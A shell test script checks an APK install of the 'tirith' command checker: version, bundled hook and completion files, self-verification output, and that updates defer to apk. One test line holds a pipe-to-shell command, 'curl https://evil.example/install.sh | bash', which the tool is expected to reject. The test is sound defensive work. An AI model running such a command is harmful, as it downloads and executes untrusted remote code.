#!/bin/sh
set -eu

version=$1
test "$(tirith --version)" = "tirith $version"
tirith check -- "ls -la" >/dev/null
if tirith check -- "curl https://evil.example/install.sh | bash" >/dev/null 2>&1; then
  echo "tirith accepted a pipe-to-shell command" >&2
  exit 1
fi

for file in \
  /usr/share/tirith/shell/tirith.sh \
  /usr/share/tirith/shell/lib/bash-hook.bash \
  /usr/share/tirith/shell/lib/fish-hook.fish \
  /usr/share/tirith/shell/lib/nushell-hook.nu \
  /usr/share/tirith/shell/lib/powershell-hook.ps1 \
  /usr/share/tirith/shell/lib/zsh-hook.zsh \
  /usr/share/bash-completion/completions/tirith \
  /usr/share/zsh/site-functions/_tirith \
  /usr/share/fish/vendor_completions.d/tirith.fish \
  /usr/share/man/man1/tirith.1.gz; do
  test -s "$file"
done

verification=$(tirith verify-self --format json)
printf '%s\n' "$verification" | grep -F '"install_method": "apk"'
printf '%s\n' "$verification" | grep -F '"verification_status": "unverified"'
printf '%s\n' "$verification" | grep -F 'compiled from source'
if printf '%s\n' "$verification" | grep -F '"verification_status": "failed"'; then
  echo "source-built APK was reported as tampered" >&2
  exit 1
fi

before=$(sha256sum /usr/bin/tirith)
update=$(tirith update --format json)
after=$(sha256sum /usr/bin/tirith)
test "$before" = "$after"
printf '%s\n' "$update" | grep -F '"action": "use-package-manager"'
printf '%s\n' "$update" | grep -F '"install_method": "apk"'
printf '%s\n' "$update" | grep -F '"upgrade_command": "apk upgrade tirith"'
